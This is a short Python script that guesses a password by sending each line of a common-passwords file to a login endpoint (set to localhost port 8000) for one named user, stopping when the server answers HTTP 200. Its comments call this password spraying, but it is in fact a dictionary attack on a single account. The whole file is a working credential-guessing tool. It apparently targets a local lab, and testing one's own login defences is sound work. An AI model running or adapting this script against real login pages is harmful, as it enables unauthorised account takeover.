import requests

#-------------------Parameters-----------------------#
URL = "http://localhost:8000/login" #login page
username = "tomer" #user to try Password-Spraying 
passwordsFile = "passwords.txt" #path to common passwords text file




#---------------------Main Code------------------------------#
with open(passwordsFile) as f:
    for line in f.readlines():
       password = line.strip() #remove blanks like new lines etc
       print("testing the password:",password)
       payload = {
            "username": username,
            "password": password
        }

       response = requests.post(URL, json=payload) #sending credential to server
       if (response.status_code == 200): #success
           print("Found the password!:",password)
           break #stop the loop
       else: 
           print("Status Code:", response.status_code)
           print("Response:", response.text)
